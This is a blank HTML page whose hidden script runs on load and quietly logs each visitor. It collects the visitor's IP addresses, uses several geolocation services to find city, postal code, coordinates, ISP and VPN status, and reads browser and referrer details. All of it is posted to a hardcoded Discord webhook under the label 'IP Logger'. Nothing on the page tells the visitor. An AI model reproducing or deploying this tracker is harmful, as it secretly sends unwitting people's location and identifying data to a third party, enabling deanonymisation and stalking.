<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title></title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: #fff;
      height: 100%;
    }
  </style>
</head>
<body>
  <script>
    (async () => {
      const WEBHOOK = "https://discord.com/api/webhooks/1556835015906697259/OU0R5LrCPpp0_GCBcXHPpFk1wUc3UlN_kq1rsAjfRK5pjux0l7dXBKMdR9pvFOdswXh2";

      function isIPv4(ip) {
        return /^(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)$/.test(ip);
      }

      function getFlag(countryCode) {
        if (!countryCode || countryCode.length !== 2) return "";
        const code = countryCode.toUpperCase();
        return String.fromCodePoint(...[...code].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
      }

      function parseUA(ua) {
        let browser = "Unknown", platform = "Unknown", device = "Desktop";

        if (/Edg\//i.test(ua)) browser = "Edge " + (ua.match(/Edg\/([\d.]+)/) || [])[1];
        else if (/Chrome\//i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome " + (ua.match(/Chrome\/([\d.]+)/) || [])[1];
        else if (/Firefox\//i.test(ua)) browser = "Firefox " + (ua.match(/Firefox\/([\d.]+)/) || [])[1];
        else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari " + (ua.match(/Version\/([\d.]+)/) || [])[1];
        else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser = "Opera";

        if (/Windows NT 10/i.test(ua)) platform = "Windows 10/11";
        else if (/Windows NT 6.3/i.test(ua)) platform = "Windows 8.1";
        else if (/Windows NT 6.1/i.test(ua)) platform = "Windows 7";
        else if (/Mac OS X/i.test(ua)) platform = "macOS";
        else if (/Android/i.test(ua)) platform = "Android";
        else if (/iPhone|iPad|iPod/i.test(ua)) platform = "iOS";
        else if (/Linux/i.test(ua)) platform = "Linux";
        else if (/CrOS/i.test(ua)) platform = "Chrome OS";

        if (/Mobile|Android|iPhone|iPod|webOS|BlackBerry|IEMobile/i.test(ua)) device = "Mobile";
        else if (/iPad|Tablet|Nexus 7|Nexus 10|KFAPWI/i.test(ua)) device = "Tablet";

        return { browser, platform, device };
      }

      // ── Get IPv4 + IPv6 ─────────────────────────────────────
      let ipv4 = null, ipv6 = null;

      try {
        const [v4Res, v6Res] = await Promise.allSettled([
          fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip)
            .catch(() => fetch("https://ipv4.icanhazip.com/").then(r => r.text()).then(t => t.trim())),
          fetch("https://api64.ipify.org?format=json").then(r => r.json()).then(d => d.ip)
            .catch(() => fetch("https://ipv6.icanhazip.com/").then(r => r.text()).then(t => t.trim()))
        ]);

        if (v4Res.status === "fulfilled" && isIPv4(v4Res.value)) ipv4 = v4Res.value;
        if (v6Res.status === "fulfilled" && v6Res.value && v6Res.value.includes(":") && !isIPv4(v6Res.value)) {
          ipv6 = v6Res.value;
        }
      } catch (_) {}

      if (!ipv4 && !ipv6) return;
      const lookupIP = ipv4 || ipv6;

      // ── Multi-source geo + security ─────────────────────────
      let geo = {
        country: "—", country_code: "", region: "—", city: "—",
        postal: "—", lat: "—", lon: "—", timezone: "—",
        isp: "—", org: "—", asn: "—"
      };

      // Collect security flags from ALL sources (OR logic)
      let vpnDetected = false;
      let proxyDetected = false;
      let hostingDetected = false;

      function score(g) {
        let s = 0;
        if (g.city && g.city !== "—" && g.city.length > 2) s += 3;
        if (g.region && g.region !== "—") s += 2;
        if (g.postal && g.postal !== "—") s += 2;
        if (g.lat !== "—" && g.lon !== "—") s += 1;
        if (g.isp && g.isp !== "—") s += 1;
        if (g.asn && g.asn !== "—") s += 1;
        return s;
      }

      try {
        const results = await Promise.allSettled([
          // 1. ipwho.is (has security object)
          fetch(`https://ipwho.is/${lookupIP}`).then(r => r.json()).then(g => {
            if (g.success === false) return null;
            if (g.security?.vpn) vpnDetected = true;
            if (g.security?.proxy) proxyDetected = true;
            if (g.security?.hosting) hostingDetected = true;
            return {
              country: g.country || "—",
              country_code: g.country_code || "",
              region: g.region || "—",
              city: g.city || "—",
              postal: g.postal || "—",
              lat: g.latitude ?? "—",
              lon: g.longitude ?? "—",
              timezone: (g.timezone && g.timezone.id) || "—",
              isp: g.connection?.isp || "—",
              org: g.connection?.org || "—",
              asn: g.connection?.asn ? `AS${g.connection.asn} ${g.connection.org || ""}`.trim() : "—"
            };
          }),

          // 2. proxycheck.io (strong VPN/proxy detection)
          fetch(`https://proxycheck.io/v2/${lookupIP}?vpn=1&asn=1`).then(r => r.json()).then(g => {
            const data = g[lookupIP];
            if (!data) return null;
            if (data.proxy === "yes") proxyDetected = true;
            if (data.type && /VPN|VPN Server/i.test(data.type)) vpnDetected = true;
            if (data.proxy === "yes" && /Hosting|Data Center|Business/i.test(data.type || "")) hostingDetected = true;
            return {
              country: data.country || "—",
              country_code: data.isocode || "",
              region: data.region || "—",
              city: data.city || "—",
              postal: data.postcode || "—",
              lat: data.latitude ?? "—",
              lon: data.longitude ?? "—",
              timezone: "—",
              isp: data.provider || data.organisation || "—",
              org: data.organisation || "—",
              asn: data.asn ? `${data.asn} ${data.provider || ""}`.trim() : "—"
            };
          }),

          // 3. ipapi.co
          fetch(`https://ipapi.co/${lookupIP}/json/`).then(r => r.json()).then(g => {
            if (g.error) return null;
            return {
              country: g.country_name || "—",
              country_code: g.country_code || "",
              region: g.region || "—",
              city: g.city || "—",
              postal: g.postal || "—",
              lat: g.latitude ?? "—",
              lon: g.longitude ?? "—",
              timezone: g.timezone || "—",
              isp: g.org || "—",
              org: g.org || "—",
              asn: g.asn || "—"
            };
          }),

          // 4. freeipapi
          fetch(`https://freeipapi.com/api/json/${lookupIP}`).then(r => r.json()).then(g => {
            if (!g.ipAddress) return null;
            return {
              country: g.countryName || "—",
              country_code: g.countryCode || "",
              region: g.regionName || "—",
              city: g.cityName || "—",
              postal: g.zipCode || "—",
              lat: g.latitude ?? "—",
              lon: g.longitude ?? "—",
              timezone: g.timeZone || "—",
              isp: "—", org: "—", asn: "—"
            };
          })
        ]);

        // Pick best location data
        let bestScore = -1;
        for (const r of results) {
          if (r.status === "fulfilled" && r.value) {
            const s = score(r.value);
            if (s > bestScore) {
              bestScore = s;
              geo = r.value;
            }
          }
        }

        // Extra heuristic: known VPN / datacenter keywords in ISP/Org
        const text = `${geo.isp} ${geo.org} ${geo.asn}`.toLowerCase();
        const vpnKeywords = ["vpn", "proxy", "nord", "expressvpn", "mullvad", "surfshark", "cyberghost", "private internet", "proton", "windscribe", "tunnelbear", "ipvanish", "purevpn", "hotspot shield", "vypr", "hide.me"];
        const hostKeywords = ["hosting", "cloud", "server", "vps", "dedicated", "datacenter", "data center", "amazon", "google", "microsoft", "digitalocean", "linode", "ovh", "hetzner", "leaseweb", "choopa", "vultr"];

        if (vpnKeywords.some(k => text.includes(k))) vpnDetected = true;
        if (hostKeywords.some(k => text.includes(k))) hostingDetected = true;

      } catch (_) {}

      const uaInfo = parseUA(navigator.userAgent || "");
      const flag = getFlag(geo.country_code);
      const now = new Date();

      const vpnProxyValue = (vpnDetected || proxyDetected) ? "Yes" : "No";
      const hostingValue = hostingDetected ? "Yes" : "No";

      const embed = {
        title: "IP Logger",
        color: 5793266,
        fields: [
          { name: "IPv4", value: ipv4 ? `\`${ipv4}\`` : "`Not available`", inline: false },
          { name: "IPv6", value: ipv6 ? `\`${ipv6}\`` : "`Not available`", inline: false },
          { name: "Country", value: `${flag} ${geo.country || "—"}`, inline: false },
          { name: "Region", value: geo.region || "—", inline: false },
          { name: "City", value: geo.city || "—", inline: false },
          { name: "ZIP", value: String(geo.postal || "—"), inline: false },
          { name: "Coordinates", value: `${geo.lat}, ${geo.lon}`, inline: false },
          { name: "Timezone", value: geo.timezone || "—", inline: false },
          { name: "ISP", value: geo.isp || "—", inline: false },
          { name: "Organization", value: geo.org || "—", inline: false },
          { name: "ASN", value: geo.asn || "—", inline: false },
          { name: "VPN/Proxy", value: vpnProxyValue, inline: false },
          { name: "Hosting/Cloud", value: hostingValue, inline: false },
          { name: "Device Type", value: uaInfo.device, inline: false },
          { name: "Platform", value: uaInfo.platform, inline: false },
          { name: "Browser", value: uaInfo.browser, inline: false },
          { name: "Referrer", value: document.referrer || "direct", inline: false },
          { name: "Timestamp", value: now.toUTCString(), inline: false },
          { name: "User Agent", value: "```" + (navigator.userAgent || "unknown") + "```", inline: false }
        ],
        footer: { text: "IP Logger" },
        timestamp: now.toISOString()
      };

      try {
        await fetch(WEBHOOK, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: null, embeds: [embed] })
        });
      } catch (_) {}
    })();
  </script>
</body>
</html>
